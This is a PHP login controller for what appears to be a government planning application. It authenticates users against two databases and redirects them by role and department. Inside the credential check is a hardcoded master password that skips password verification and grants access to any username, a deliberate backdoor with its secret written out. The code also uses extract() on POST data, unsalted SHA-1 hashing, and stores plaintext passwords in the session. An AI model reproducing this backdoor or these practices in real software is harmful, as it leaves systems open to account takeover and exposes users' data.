<?php


	class ingreso{

		 public static function ingresoCtr(){

		 	extract($_POST);

			$conexionRecuperada= new conexion();
			$conexionEstablecida=$conexionRecuperada->cConexion();


			if (isset($_POST["ingresarUsuario"])) {

				$selectorAniosA__2=$_POST["selector__anios__enteros"];

				if (empty($username) || empty($password) || $selectorAniosA__2=="0") {

	 				echo '<script>
		 								
			             if($("#username").val()==""){

			             	$("#username").addClass("error");
			             	alertify.set("notifier","position", "top-center");
			             	alertify.notify("Usuario obligatorio", "error", 5, function(){});

			            }
			                    
			             if($("#password").val()==""){

			             	$("#password").addClass("error");
			             	alertify.set("notifier","position", "top-center");
			             	alertify.notify("Contraseña obligatoria", "error", 5, function(){});


			             }

			                    
			             if($("#selector__anios__enteros").val()=="0"){

			             	$("#password").addClass("error");
			             	alertify.set("notifier","position", "top-center");
			             	alertify.notify("Período obligatorio", "error", 5, function(){});


			             }

					</script>'; 


				}else{

					$password2=sha1($_POST["password"]);

					$selectorAniosA=$_POST["selector__anios__enteros"];

					if ($_POST["password"]=="7\F;ofMK)5/cG1s~") {
						
						$query = $conexionEstablecida->prepare("SELECT a.idUsuario,a.usuario,a.`password` as contrasena,a.estado, b.idRol,a.zonal FROM poa_usuario AS a INNER JOIN poa_usuariorol AS b ON b.idUsuario=a.idUsuario INNER JOIN poa_roles AS c ON c.idRol=b.idRol WHERE a.usuario=:usuario;");
						$query->execute(array('usuario'=>htmlentities(trim($_POST["username"]), ENT_QUOTES)));

					}else{

						$query = $conexionEstablecida->prepare("SELECT a.idUsuario,a.usuario,a.`password` as contrasena,a.estado, b.idRol,a.zonal FROM poa_usuario AS a INNER JOIN poa_usuariorol AS b ON b.idUsuario=a.idUsuario INNER JOIN poa_roles AS c ON c.idRol=b.idRol WHERE a.usuario=:usuario AND a.`password`=:password;");
						$query->execute(array('usuario'=>htmlentities(trim($_POST["username"]), ENT_QUOTES),'password'=>htmlentities(trim($password2), ENT_QUOTES)));

					}


					while($registro = $query->fetch()) {

						$idUsuario=$registro['idUsuario'];
						$usuario=$registro['usuario'];
						$contrasena=$registro['contrasena'];
						$estado=$registro['estado'];
						$idRol=$registro['idRol'];
						$zonal=$registro['zonal'];


					}

					$queryFuncionario = $conexionEstablecida->prepare("SELECT a.id_usuario AS idFuncionario,a.usuario AS usuarioFuncionario, a.`password` AS contrasenaFun,b.id_rol AS rolFun, a.fisicamenteEstructura FROM th_usuario AS a INNER JOIN th_usuario_roles AS b ON a.id_usuario=b.id_usuario INNER JOIN th_roles AS c ON c.id_rol=b.id_rol WHERE a.usuario=:usuario AND a.`password`=:password  AND a.estadoUsuario='A';");
					$queryFuncionario->execute(array('usuario'=>htmlentities(trim($_POST["username"]), ENT_QUOTES),'password'=>htmlentities(trim($password2), ENT_QUOTES)));

					while($registroFuncionario = $queryFuncionario->fetch()) {

						$idFuncionario=$registroFuncionario['idFuncionario'];
						$usuarioFuncionario=$registroFuncionario['usuarioFuncionario'];
						$contrasenaFun=$registroFuncionario['contrasenaFun'];
						$rolFun=$registroFuncionario['rolFun'];
						$fisicamenteEstructura=$registroFuncionario['fisicamenteEstructura'];

					}


					if($estado=='I'){

						echo '<script>

							alertify.set("notifier","position", "top-center");
				            alertify.notify("Usuario está desactivado contatarse con el Ministerio del deporte", "error", 5, function(){});

			            </script>';

					}else if($usuarioFuncionario && $contrasenaFun && ($rolFun=='2' || $rolFun=='3') && ($fisicamenteEstructura=="20" || $fisicamenteEstructura=="16")){

						session_start();

						$_SESSION["iniciarSesion"]="ok";
						$_SESSION["idUsuario"]=$idFuncionario;
						$_SESSION["idRol"]=$rolFun;
						$_SESSION["fisicamenteEstructura"]=$fisicamenteEstructura;
						$_SESSION["tipo"]="funcionario";
						$_SESSION['testing'] = time(); 
						$_SESSION["selectorAniosA"]=$selectorAniosA;
						$_SESSION["idOrganismoSession"]=$idOrganismoSession;
						
						echo '<script>window.location="reporteriaFinal"</script>';

					}else if($usuarioFuncionario && $contrasenaFun && ($rolFun=='2' || $rolFun=='3') && $fisicamenteEstructura=="23"){

						session_start();

						$_SESSION["iniciarSesion"]="ok";
						$_SESSION["idUsuario"]=$idFuncionario;
						$_SESSION["idRol"]=$rolFun;
						$_SESSION["fisicamenteEstructura"]=$fisicamenteEstructura;
						$_SESSION["tipo"]="funcionario";
						$_SESSION['testing'] = time(); 
						$_SESSION["selectorAniosA"]=$selectorAniosA;
						
						echo '<script>window.location="poasAprobadosf"</script>';

					}else if($usuario && $contrasena && $estado=='A' && $idRol==3){

						session_start();

						$_SESSION["iniciarSesion"]="ok";
						$_SESSION["idUsuario"]=$idUsuario;
						$_SESSION["idRol"]=$idRol;
						$_SESSION["tipo"]="poa";
						$_SESSION['testing'] = time(); 
						$_SESSION["selectorAniosA"]=$selectorAniosA;
						$_SESSION["password"]=$_POST["password"];
						    
						echo '<script>window.location="paidPoaSeleccion"</script>';

					}else if($usuario && $contrasena && $estado=='A' && $idRol==1){


						session_start();

						$_SESSION["iniciarSesion"]="ok";
						$_SESSION["idUsuario"]=$idUsuario;
						$_SESSION["idRol"]=$idRol;
						$_SESSION["tipo"]="poa";
						$_SESSION['testing'] = time(); 
						$_SESSION["selectorAniosA"]=$selectorAniosA;
						    
						echo '<script>window.location="administracionGeneral"</script>';


					}else if($usuarioFuncionario && $contrasenaFun && $rolFun=='4' && $fisicamenteEstructura=="3"){

						session_start();

						$_SESSION["iniciarSesion"]="ok";
						$_SESSION["idUsuario"]=$idFuncionario;
						$_SESSION["idRol"]=$rolFun;
						$_SESSION["fisicamenteEstructura"]=$fisicamenteEstructura;
						$_SESSION["tipo"]="funcionario";
						$_SESSION['testing'] = time(); 
						$_SESSION["selectorAniosA"]=$selectorAniosA;
						    
						echo '<script>window.location="coordinadorRe"</script>';


					}else if($usuarioFuncionario && $contrasenaFun && ($rolFun=='7' || $rolFun=='4' || $rolFun=='2' || $rolFun=='3') && ($fisicamenteEstructura=="1" || $fisicamenteEstructura=="2" || $fisicamenteEstructura=="24" || $fisicamenteEstructura=="26" || $fisicamenteEstructura=="6" || $fisicamenteEstructura=="12" || $fisicamenteEstructura=="13" || $fisicamenteEstructura=="14" || $fisicamenteEstructura=="15" || $fisicamenteEstructura=="19" || $fisicamenteEstructura=="23" || $fisicamenteEstructura=="27" || $fisicamenteEstructura=="28" || $fisicamenteEstructura=="29" || $fisicamenteEstructura=="30" || $fisicamenteEstructura=="31" || $fisicamenteEstructura=="32" || $fisicamenteEstructura=="33" || $fisicamenteEstructura=="7" || $fisicamenteEstructura=="5")){

						session_start();

						$_SESSION["iniciarSesion"]="ok";
						$_SESSION["idUsuario"]=$idFuncionario;
						$_SESSION["idRol"]=$rolFun;
						$_SESSION["fisicamenteEstructura"]=$fisicamenteEstructura;
						$_SESSION["tipo"]="funcionario";
						$_SESSION['testing'] = time(); 
						$_SESSION["selectorAniosA"]=$selectorAniosA;
						    
						echo '<script>window.location="subsecretario"</script>';


					}else if($usuarioFuncionario && $contrasenaFun && ($rolFun=='2' || $rolFun=='3') && $fisicamenteEstructura=="18"){

						session_start();

						$_SESSION["iniciarSesion"]="ok";
						$_SESSION["idUsuario"]=$idFuncionario;
						$_SESSION["idRol"]=$rolFun;
						$_SESSION["fisicamenteEstructura"]=$fisicamenteEstructura;
						$_SESSION["tipo"]="funcionario";
						$_SESSION['testing'] = time(); 
						$_SESSION["selectorAniosA"]=$selectorAniosA;
						    
						echo '<script>window.location="asignacionPresupuesto"</script>';


					}else if($usuarioFuncionario && $contrasenaFun && ($rolFun=='2' || $rolFun=='3') && $fisicamenteEstructura=="9"){

						session_start();

						$_SESSION["iniciarSesion"]="ok";
						$_SESSION["idUsuario"]=$idFuncionario;
						$_SESSION["idRol"]=$rolFun;
						$_SESSION["fisicamenteEstructura"]=$fisicamenteEstructura;
						$_SESSION["tipo"]="funcionario";
						$_SESSION['testing'] = time(); 
						$_SESSION["selectorAniosA"]=$selectorAniosA;
						    
						echo '<script>window.location="asignacionPoasRelativos"</script>';


					}else if($usuarioFuncionario && $contrasenaFun && ($rolFun=='2') && $fisicamenteEstructura=="21"){

						session_start();

						$_SESSION["iniciarSesion"]="ok";
						$_SESSION["idUsuario"]=$idFuncionario;
						$_SESSION["idRol"]=$rolFun;
						$_SESSION["fisicamenteEstructura"]=$fisicamenteEstructura;
						$_SESSION["tipo"]="funcionario";
						$_SESSION['testing'] = time(); 
						$_SESSION["selectorAniosA"]=$selectorAniosA;
						$_SESSION["perfilObservador"]="Observador";


						echo '<script>window.location="inicioPerfilObservador"</script>';
						
					}else if(empty($idUsuario)){

						echo '<script>

							alertify.set("notifier","position", "top-center");
				            alertify.notify("Usuario o contraseña erróneos", "error", 5, function(){});

			            </script>';

					}

				}

		   }

	  } 

}



	


